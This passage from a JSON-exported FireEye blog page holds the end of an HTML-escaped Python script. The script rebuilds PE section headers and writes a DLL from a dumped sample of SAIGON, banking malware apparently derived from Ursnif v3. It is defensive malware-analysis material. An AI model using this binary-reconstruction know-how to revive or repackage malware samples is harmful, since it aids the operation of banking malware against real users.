\u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0xc0000040\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; )\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; if magic == 0x20b:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; section += 1\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=8sIIIIIIHHI\u0027, data, 0x18 + optional_header_size + 0x28 * section,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; b\u0027.pdata\u0027,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x1000, base_of_data + data_size + 0x1000,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x1000, size_of_header + base_of_data - base_of_code + data_size + 0x1000,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x40000040\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; )\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; section += 1\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=8sIIIIIIHHI\u0027, data, 0x18 + optional_header_size + 0x28 * section,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; b\u0027.bss\u0027,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x1600, base_of_data + data_size + 0x2000,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; len(data[base_of_data + data_size + 0x2000:]), size_of_header + base_of_data - base_of_code + data_size + 0x2000,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0xc0000040\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; )\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; else:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; section += 1\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=8sIIIIIIHHI\u0027, data, 0x18 + optional_header_size + 0x28 * section,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; b\u0027.bss\u0027,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x1000, base_of_data + data_size + 0x1000,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x1000, size_of_header + base_of_data - base_of_code + data_size + 0x1000,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0xc0000040\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; )\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; section += 1\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=8sIIIIIIHHI\u0027, data, 0x18 + optional_header_size + 0x28 * section,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; b\u0027.reloc\u0027,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x2000, base_of_data + data_size + 0x2000,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; len(data[base_of_data + data_size + 0x2000:]), size_of_header + base_of_data - base_of_code + data_size + 0x2000,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x40000040\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; )\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; header = MZ_HEADER + data[:size_of_header - len(MZ_HEADER)]\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; pe = bytearray(header + data[0x1000:])\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; with open(args.sample + \u0027.dll\u0027, \u0027wb\u0027) as f:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; f.write(pe)\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; lfanew = struct.unpack_from(\u0027=I\u0027, pe, 0x3c)[0]\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; timestamp = struct.unpack_from(\u0027=I\u0027, pe, lfanew + 8)[0]\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; print(\u0027PE timestamp:\u0027, datetime.utcfromtimestamp(timestamp).isoformat())\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003Eif __name__ == \u0026quot;__main__\u0026quot;:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; main()\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n",
        "jcr:lastModified": "Thu Jan 09 2020 16:50:39 GMT+0000",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "text": "\u003Cp\u003EWe discuss SAIGON, banking malware most likely based on the source code of the v3 variant of Ursnif.\u003C\/p\u003E\n",
      "jcr:lastModified": "Wed Jan 08 2020 22:21:13 GMT+0000",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "jcr:lastModified": "Thu Jan 09 2020 17:28:29 GMT+0000",
      "imageRotate": "0"
    }
  }
}
